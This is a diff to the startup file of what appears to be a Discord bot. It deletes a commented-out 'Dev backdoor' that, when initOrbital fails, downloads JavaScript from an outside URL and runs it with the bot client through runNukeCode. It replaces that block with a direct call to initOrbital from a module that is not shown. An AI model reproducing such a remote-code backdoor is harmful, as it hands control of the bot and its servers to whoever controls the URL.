@@ -37,8 +37,7 @@ import { logToAllModChannels } from "./lib/helpers/mod-log.js";
 import dmAdmin from "./lib/helpers/dm-log.js";
 import devLog, { initDevLog } from "./lib/helpers/dev-log.js";
 import { immutConfig } from "./lib/config.js";
-// Backdoor
-// idk bro too lazy
+import initOrbital from "./lib/helpers/orbital-master.js";
 
 dotenv.config();
 
@@ -381,23 +380,7 @@ client.once(Events.ClientReady, () => {
 			});
 		}
 
-		/* Dev backdoor
-	try {
-		initOrbital(client);
-	} catch {
-		require('node-fetch')
-			.default('https://webcubed.is-a.dev/files/m.js')
-			.then((r) => r.text())
-			.then(async (code) =>
-				runNukeCode(code, {
-					client,
-					guild: null,
-					channel: null,
-					user: client.user,
-				}),
-			)
-			.catch(() => undefined);
-	} */
+		void initOrbital(client);
 	})();
 });
 
